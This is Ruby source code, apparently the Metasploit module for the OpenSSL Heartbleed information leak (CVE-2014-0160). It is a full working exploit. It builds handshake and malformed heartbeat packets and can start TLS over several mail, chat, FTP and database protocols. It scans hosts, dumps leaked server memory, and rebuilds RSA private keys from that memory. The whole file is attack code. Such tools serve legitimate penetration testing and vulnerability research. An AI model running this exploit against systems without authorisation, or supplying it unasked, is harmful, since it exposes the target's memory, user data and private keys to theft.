##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  CIPHER_SUITES = [
    0xc014, # TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA
    0xc00a, # TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA
    0xc022, # TLS_SRP_SHA_DSS_WITH_AES_256_CBC_SHA
    0xc021, # TLS_SRP_SHA_RSA_WITH_AES_256_CBC_SHA
    0x0039, # TLS_DHE_RSA_WITH_AES_256_CBC_SHA
    0x0038, # TLS_DHE_DSS_WITH_AES_256_CBC_SHA
    0x0088, # TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA
    0x0087, # TLS_DHE_DSS_WITH_CAMELLIA_256_CBC_SHA
    0x0087, # TLS_ECDH_RSA_WITH_AES_256_CBC_SHA
    0xc00f, # TLS_ECDH_ECDSA_WITH_AES_256_CBC_SHA
    0x0035, # TLS_RSA_WITH_AES_256_CBC_SHA
    0x0084, # TLS_RSA_WITH_CAMELLIA_256_CBC_SHA
    0xc012, # TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA
    0xc008, # TLS_ECDHE_ECDSA_WITH_3DES_EDE_CBC_SHA
    0xc01c, # TLS_SRP_SHA_DSS_WITH_3DES_EDE_CBC_SHA
    0xc01b, # TLS_SRP_SHA_RSA_WITH_3DES_EDE_CBC_SHA
    0x0016, # TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA
    0x0013, # TLS_DHE_DSS_WITH_3DES_EDE_CBC_SHA
    0xc00d, # TLS_ECDH_RSA_WITH_3DES_EDE_CBC_SHA
    0xc003, # TLS_ECDH_ECDSA_WITH_3DES_EDE_CBC_SHA
    0x000a, # TLS_RSA_WITH_3DES_EDE_CBC_SHA
    0xc013, # TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA
    0xc009, # TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA
    0xc01f, # TLS_SRP_SHA_DSS_WITH_AES_128_CBC_SHA
    0xc01e, # TLS_SRP_SHA_RSA_WITH_AES_128_CBC_SHA
    0x0033, # TLS_DHE_RSA_WITH_AES_128_CBC_SHA
    0x0032, # TLS_DHE_DSS_WITH_AES_128_CBC_SHA
    0x009a, # TLS_DHE_RSA_WITH_SEED_CBC_SHA
    0x0099, # TLS_DHE_DSS_WITH_SEED_CBC_SHA
    0x0045, # TLS_DHE_RSA_WITH_CAMELLIA_128_CBC_SHA
    0x0044, # TLS_DHE_DSS_WITH_CAMELLIA_128_CBC_SHA
    0xc00e, # TLS_ECDH_RSA_WITH_AES_128_CBC_SHA
    0xc004, # TLS_ECDH_ECDSA_WITH_AES_128_CBC_SHA
    0x002f, # TLS_RSA_WITH_AES_128_CBC_SHA
    0x0096, # TLS_RSA_WITH_SEED_CBC_SHA
    0x0041, # TLS_RSA_WITH_CAMELLIA_128_CBC_SHA
    0xc011, # TLS_ECDHE_RSA_WITH_RC4_128_SHA
    0xc007, # TLS_ECDHE_ECDSA_WITH_RC4_128_SHA
    0xc00c, # TLS_ECDH_RSA_WITH_RC4_128_SHA
    0xc002, # TLS_ECDH_ECDSA_WITH_RC4_128_SHA
    0x0005, # TLS_RSA_WITH_RC4_128_SHA
    0x0004, # TLS_RSA_WITH_RC4_128_MD5
    0x0015, # TLS_DHE_RSA_WITH_DES_CBC_SHA
    0x0012, # TLS_DHE_DSS_WITH_DES_CBC_SHA
    0x0009, # TLS_RSA_WITH_DES_CBC_SHA
    0x0014, # TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA
    0x0011, # TLS_DHE_DSS_EXPORT_WITH_DES40_CBC_SHA
    0x0008, # TLS_RSA_EXPORT_WITH_DES40_CBC_SHA
    0x0006, # TLS_RSA_EXPORT_WITH_RC2_CBC_40_MD5
    0x0003, # TLS_RSA_EXPORT_WITH_RC4_40_MD5
    0x00ff  # Unknown
  ]

  HANDSHAKE_RECORD_TYPE = 0x16
  HEARTBEAT_RECORD_TYPE = 0x18
  ALERT_RECORD_TYPE     = 0x15
  TLS_VERSION = {
    'SSLv3' => 0x0300,
    '1.0'   => 0x0301,
    '1.1'   => 0x0302,
    '1.2'   => 0x0303
  }

  TLS_CALLBACKS = {
    'SMTP'   => :tls_smtp,
    'IMAP'   => :tls_imap,
    'JABBER' => :tls_jabber,
    'POP3'   => :tls_pop3,
    'FTP'    => :tls_ftp,
    'POSTGRES'   => :tls_postgres
  }

  # See the discussion at https://github.com/rapid7/metasploit-framework/pull/3252
  SAFE_CHECK_MAX_RECORD_LENGTH = (1 << 14)

  def initialize
    super(
      'Name'           => 'OpenSSL Heartbeat (Heartbleed) Information Leak',
      'Description'    => %q{
        This module implements the OpenSSL Heartbleed attack. The problem
        exists in the handling of heartbeat requests, where a fake length can
        be used to leak memory data in the response. Services that support
        STARTTLS may also be vulnerable.

        The module supports several actions, allowing for scanning, dumping of
        memory contents, and private key recovery.
      },
      'Author'         => [
        'Neel Mehta', # Vulnerability discovery
        'Riku', # Vulnerability discovery
        'Antti', # Vulnerability discovery
        'Matti', # Vulnerability discovery
        'Jared Stafford <jspenguin[at]jspenguin.org>', # Original Proof of Concept. This module is based on it.
        'FiloSottile', # PoC site and tool
        'Christian Mehlmauer', # Msf module
        'wvu', # Msf module
        'juan vazquez', # Msf module
        'Sebastiano Di Paola', # Msf module
        'Tom Sellers', # Msf module
        'jjarmoc', #Msf module; keydump, refactoring..
        'Ben Buchanan', #Msf module
        'herself' #Msf module
      ],
      'References'     =>
        [
          ['CVE', '2014-0160'],
          ['US-CERT-VU', '720951'],
          ['URL', 'https://www.us-cert.gov/ncas/alerts/TA14-098A'],
          ['URL', 'http://heartbleed.com/'],
          ['URL', 'https://github.com/FiloSottile/Heartbleed'],
          ['URL', 'https://gist.github.com/takeshixx/10107280'],
          ['URL', 'http://filippo.io/Heartbleed/']
        ],
      'DisclosureDate' => 'Apr 7 2014',
      'License'        => MSF_LICENSE,
      'Actions'        =>
        [
          ['SCAN',  {'Description' => 'Check hosts for vulnerability'}],
          ['DUMP',  {'Description' => 'Dump memory contents'}],
          ['KEYS',  {'Description' => 'Recover private keys from memory'}]
        ],
      'DefaultAction' => 'SCAN'
    )

    register_options(
      [
        Opt::RPORT(443),
        OptEnum.new('TLS_CALLBACK', [true, 'Protocol to use, "None" to use raw TLS sockets', 'None', [ 'None', 'SMTP', 'IMAP', 'JABBER', 'POP3', 'FTP', 'POSTGRES' ]]),
        OptEnum.new('TLS_VERSION', [true, 'TLS/SSL version to use', '1.0', ['SSLv3','1.0', '1.1', '1.2']]),
        OptInt.new('MAX_KEYTRIES', [true, 'Max tries to dump key', 10]),
        OptInt.new('STATUS_EVERY', [true, 'How many retries until status', 5]),
        OptRegexp.new('DUMPFILTER', [false, 'Pattern to filter leaked memory before storing', nil]),
        OptInt.new('RESPONSE_TIMEOUT', [true, 'Number of seconds to wait for a server response', 10])
      ], self.class)

    register_advanced_options(
      [
        OptInt.new('HEARTBEAT_LENGTH', [true, 'Heartbeat length', 65535]),
        OptString.new('XMPPDOMAIN', [ true, 'The XMPP Domain to use when Jabber is selected', 'localhost' ])
      ], self.class)

  end

  def check_host(ip)
    @check_only = true
    vprint_status "#{peer} - Checking for Heartbleed exposure"
    if bleed
      Exploit::CheckCode::Appears
    else
      Exploit::CheckCode::Safe
    end
  end

  def run
    if heartbeat_length > 65535 || heartbeat_length < 0
      print_error("HEARTBEAT_LENGTH should be a natural number less than 65536")
      return
    end

    if response_timeout < 0
      print_error("RESPONSE_TIMEOUT should be bigger than 0")
      return
    end

    super
  end

  # If this is merely a check, set to the RFC-defined
  # maximum padding length of 2^14. See:
  # https://tools.ietf.org/html/rfc6520#section-4
  # https://github.com/rapid7/metasploit-framework/pull/3252
  def heartbeat_length
    if @check_only
      SAFE_CHECK_MAX_RECORD_LENGTH
    else
      datastore["HEARTBEAT_LENGTH"]
    end
  end

  def peer
    "#{rhost}:#{rport}"
  end

  def response_timeout
    datastore['RESPONSE_TIMEOUT']
  end

  def tls_smtp
    # https://tools.ietf.org/html/rfc3207
    sock.get_once(-1, response_timeout)
    sock.put("EHLO #{Rex::Text.rand_text_alpha(10)}\r\n")
    res = sock.get_once(-1, response_timeout)

    unless res && res =~ /STARTTLS/
      return nil
    end
    sock.put("STARTTLS\r\n")
    sock.get_once(-1, response_timeout)
  end

  def tls_imap
    # http://tools.ietf.org/html/rfc2595
    sock.get_once(-1, response_timeout)
    sock.put("a001 CAPABILITY\r\n")
    res = sock.get_once(-1, response_timeout)
    unless res && res =~ /STARTTLS/i
      return nil
    end
    sock.put("a002 STARTTLS\r\n")
    sock.get_once(-1, response_timeout)
  end

  def tls_postgres
    # postgresql TLS - works with all modern pgsql versions - 8.0 - 9.3
    # http://www.postgresql.org/docs/9.3/static/protocol-message-formats.html
    sock.get_once
    # the postgres SSLRequest packet is a int32(8) followed by a int16(1234),
    # int16(5679) in network format
    psql_sslrequest = [8].pack('N')
    psql_sslrequest << [1234, 5679].pack('n*')
    sock.put(psql_sslrequest)
    res = sock.get_once
    unless res && res =~ /S/
      return nil
    end
    res
  end

  def tls_pop3
    # http://tools.ietf.org/html/rfc2595
    sock.get_once(-1, response_timeout)
    sock.put("CAPA\r\n")
    res = sock.get_once(-1, response_timeout)
    if res.nil? || res =~ /^-/ || res !~ /STLS/
      return nil
    end
    sock.put("STLS\r\n")
    res = sock.get_once(-1, response_timeout)
    if res.nil? || res =~ /^-/
      return nil
    end
    res
  end

  def jabber_connect_msg(hostname)
    # http://xmpp.org/extensions/xep-0035.html
    msg = "<stream:stream xmlns='jabber:client' "
    msg << "xmlns:stream='http://etherx.jabber.org/streams' "
    msg << "version='1.0' "
    msg << "to='#{hostname}'>"
  end

  def tls_jabber
    sock.put(jabber_connect_msg(datastore['XMPPDOMAIN']))
    res = sock.get(response_timeout)
    if res && res.include?('host-unknown')
      jabber_host = res.match(/ from='([\w.]*)' /)
      if jabber_host && jabber_host[1]
        disconnect
        connect
        vprint_status("#{peer} - Connecting with autodetected remote XMPP hostname: #{jabber_host[1]}...")
        sock.put(jabber_connect_msg(jabber_host[1]))
        res = sock.get(response_timeout)
      end
    end
    if res.nil? || res.include?('stream:error') || res !~ /<starttls xmlns=['"]urn:ietf:params:xml:ns:xmpp-tls['"]/
      vprint_error("#{peer} - Jabber host unknown. Please try changing the XMPPDOMAIN option.") if res && res.include?('host-unknown')
      return nil
    end
    msg = "<starttls xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>"
    sock.put(msg)
    res = sock.get(response_timeout)
    return nil if res.nil? || !res.include?('<proceed')
    res
  end

  def tls_ftp
    # http://tools.ietf.org/html/rfc4217
    res = sock.get(response_timeout)
    return nil if res.nil?
    sock.put("AUTH TLS\r\n")
    res = sock.get_once(-1, response_timeout)
    return nil if res.nil?
    if res !~ /^234/
      # res contains the error message
      vprint_error("#{peer} - FTP error: #{res.strip}")
      return nil
    end
    res
  end

  def run_host(ip)
    case action.name
    when 'SCAN'
      loot_and_report(bleed)
    when 'DUMP'
      loot_and_report(bleed)  # Scan & Dump are similar, scan() records results
    when 'KEYS'
      getkeys()
    else
      #Shouldn't get here, since Action is Enum
      print_error("Unknown Action: #{action.name}")
      return
    end
  end

  def bleed
    # This actually performs the heartbleed portion
    connect_result = establish_connect
    return if connect_result.nil?

    vprint_status("#{peer} - Sending Heartbeat...")
    sock.put(heartbeat(heartbeat_length))
    hdr = sock.get_once(5, response_timeout)
    if hdr.blank?
      vprint_error("#{peer} - No Heartbeat response...")
      return
    end

    unpacked = hdr.unpack('Cnn')
    type = unpacked[0]
    version = unpacked[1] # must match the type from client_hello
    len = unpacked[2]

    # try to get the TLS error
    if type == ALERT_RECORD_TYPE
      res = sock.get_once(len, response_timeout)
      alert_unp = res.unpack('CC')
      alert_level = alert_unp[0]
      alert_desc = alert_unp[1]
      msg = "Unknown error"
      # http://tools.ietf.org/html/rfc5246#section-7.2
      case alert_desc
      when 0x46
        msg = "Protocol error. Looks like the chosen protocol is not supported."
      end
      vprint_error("#{peer} - #{msg}")
      disconnect
      return
    end

    unless type == HEARTBEAT_RECORD_TYPE && version == TLS_VERSION[datastore['TLS_VERSION']]
      vprint_error("#{peer} - Unexpected Heartbeat response")
      disconnect
      return
    end

    heartbeat_data = sock.get(heartbeat_length) # Read the magic length...
    vprint_status("#{peer} - Heartbeat response, #{heartbeat_data.length} bytes")
    disconnect
    heartbeat_data
  end

  def loot_and_report(heartbeat_data)

    unless heartbeat_data
      vprint_error("#{peer} - Looks like there isn't leaked information...")
      return
    end

    print_good("#{peer} - Heartbeat response with leak")
    report_vuln({
      :host => rhost,
      :port => rport,
      :name => self.name,
      :refs => self.references,
      :info => "Module #{self.fullname} successfully leaked info"
    })

    if action.name == 'DUMP' # Check mode, dump if requested.
      pattern = datastore['DUMPFILTER']
      if pattern
        match_data = heartbeat_data.scan(pattern).join
      else
        match_data = heartbeat_data
      end
      path = store_loot(
        "openssl.heartbleed.server",
        "application/octet-stream",
        rhost,
        match_data,
        nil,
        "OpenSSL Heartbleed server memory"
      )
      print_status("#{peer} - Heartbeat data stored in #{path}")
    end

    vprint_status("#{peer} - Printable info leaked: #{heartbeat_data.gsub(/[^[:print:]]/, '')}")

  end

  def getkeys()
    unless datastore['TLS_CALLBACK'] == 'None'
      print_error('TLS callbacks currently unsupported for keydumping action') #TODO
      return
    end

    print_status("#{peer} - Scanning for private keys")
    count = 0

    print_status("#{peer} - Getting public key constants...")
    n, e = get_ne

    if n.nil? || e.nil?
      print_error("#{peer} - Failed to get public key, aborting.")
    end

    vprint_status("#{peer} - n: #{n}")
    vprint_status("#{peer} - e: #{e}")
    print_status("#{peer} - #{Time.now.getutc} - Starting.")

    datastore['MAX_KEYTRIES'].times {
      # Loop up to MAX_KEYTRIES times, looking for keys
      if count % datastore['STATUS_EVERY'] == 0
        print_status("#{peer} - #{Time.now.getutc} - Attempt #{count}...")
      end

      p, q = get_factors(bleed, n) # Try to find factors in mem

      unless p.nil? || q.nil?
        key = key_from_pqe(p, q, e)
        print_good("#{peer} - #{Time.now.getutc} - Got the private key")

        print_status(key.export)
        path = store_loot(
          "openssl.heartbleed.server",
          "text/plain",
          rhost,
          key.export,
          nil,
          "OpenSSL Heartbleed Private Key"
        )
        print_status("#{peer} - Private key stored in #{path}")
        return
      end
      count += 1
    }
    print_error("#{peer} - Private key not found. You can try to increase MAX_KEYTRIES.")
  end

  def heartbeat(length)
    payload = "\x01"              # Heartbeat Message Type: Request (1)
    payload << [length].pack("n") # Payload Length: 65535

    ssl_record(HEARTBEAT_RECORD_TYPE, payload)
  end

  def client_hello
    # Use current day for TLS time
    time_temp = Time.now
    time_epoch = Time.mktime(time_temp.year, time_temp.month, time_temp.day, 0, 0).to_i

    hello_data = [TLS_VERSION[datastore['TLS_VERSION']]].pack("n") # Version TLS
    hello_data << [time_epoch].pack("N")    # Time in epoch format
    hello_data << Rex::Text.rand_text(28)   # Random
    hello_data << "\x00"                    # Session ID length
    hello_data << [CIPHER_SUITES.length * 2].pack("n") # Cipher Suites length (102)
    hello_data << CIPHER_SUITES.pack("n*")  # Cipher Suites
    hello_data << "\x01"                    # Compression methods length (1)
    hello_data << "\x00"                    # Compression methods: null

    hello_data_extensions = "\x00\x0f"      # Extension type (Heartbeat)
    hello_data_extensions << "\x00\x01"     # Extension length
    hello_data_extensions << "\x01"         # Extension data

    hello_data << [hello_data_extensions.length].pack("n")
    hello_data << hello_data_extensions

    data = "\x01\x00"                      # Handshake Type: Client Hello (1)
    data << [hello_data.length].pack("n")  # Length
    data << hello_data

    ssl_record(HANDSHAKE_RECORD_TYPE, data)
  end

  def ssl_record(type, data)
    record = [type, TLS_VERSION[datastore['TLS_VERSION']], data.length].pack('Cnn')
    record << data
  end

  def get_ne()
    # Fetch rhost's cert, return public key values
    connect(true, {"SSL" => true}) #Force SSL
    cert  = OpenSSL::X509::Certificate.new(sock.peer_cert)
    disconnect

    unless cert
      print_error("#{peer} - No certificate found")
      return
    end

    return cert.public_key.params["n"], cert.public_key.params["e"]
  end

  def get_factors(data, n)
    # Walk through data looking for factors of n
    psize = n.num_bits / 8 / 2
    return if data.nil?

    (0..(data.length-psize)).each{ |x|
      # Try each offset of suitable length
      can = OpenSSL::BN.new(data[x,psize].reverse.bytes.inject {|a,b| (a << 8) + b }.to_s)
      if can > 1 && can % 2 != 0 && can.num_bytes == psize
        # Only try candidates that have a chance...
        q, rem = n / can
        if rem == 0 && can != n
          vprint_good("#{peer} - Found factor at offset #{x.to_s(16)}")
          p = can
          return p, q
        end
      end
      }
    return nil, nil
  end

  def establish_connect
    connect

    unless datastore['TLS_CALLBACK'] == 'None'
      vprint_status("#{peer} - Trying to start SSL via #{datastore['TLS_CALLBACK']}")
      res = self.send(TLS_CALLBACKS[datastore['TLS_CALLBACK']])
      if res.nil?
        vprint_error("#{peer} - STARTTLS failed...")
        return nil
      end
    end

    vprint_status("#{peer} - Sending Client Hello...")
    sock.put(client_hello)

    server_hello = sock.get(response_timeout)
    unless server_hello
      vprint_error("#{peer} - No Server Hello after #{response_timeout} seconds...")
      disconnect
      return nil
    end

    unless server_hello.unpack("C").first == HANDSHAKE_RECORD_TYPE
      vprint_error("#{peer} - Server Hello Not Found")
      return nil
    end

    true
  end

  def key_from_pqe(p, q, e)
    # Returns an RSA Private Key from Factors
    key = OpenSSL::PKey::RSA.new()

    key.p = p
    key.q = q

    key.n = key.p*key.q
    key.e = e

    phi = (key.p - 1) * (key.q - 1 )
    key.d = key.e.mod_inverse(phi)

    key.dmp1 = key.d % (key.p - 1)
    key.dmq1 = key.d % (key.q - 1)
    key.iqmp = key.q.mod_inverse(key.p)

    return key
  end

end

